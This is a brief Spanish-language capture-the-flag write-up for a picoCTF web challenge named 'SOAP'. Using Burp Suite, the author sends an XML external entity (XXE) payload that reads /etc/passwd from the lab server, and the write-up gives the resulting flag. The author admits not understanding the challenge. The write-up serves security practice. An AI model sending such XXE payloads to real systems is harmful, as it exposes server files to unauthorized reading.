
## Reto
SOAP

## Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

## Solucion
- al abrir el link solo aparece una pagina con 3 botones cada uno con envia una respuesta diferente
- Abro foxyproxy y burpsuite para ver las respuestas que me da
- una que entro a burpsuite y detengo el trafico lo mando al repeater y en Request pego lo siguiente:
```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]> <data>
	<ID>
		&xxe;
	</ID>
</data>
```

- al enviarlo al servidor me regresa la respuesta donde encuentro la bandera:**picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}**
<img width="1920" height="945" alt="image" src="https://github.com/user-attachments/assets/87077e01-dcc8-4b14-9122-ecab737d4177" />

## Notas
- la verdad que no entendi que estamos haciendo en este desafio

## Referencias
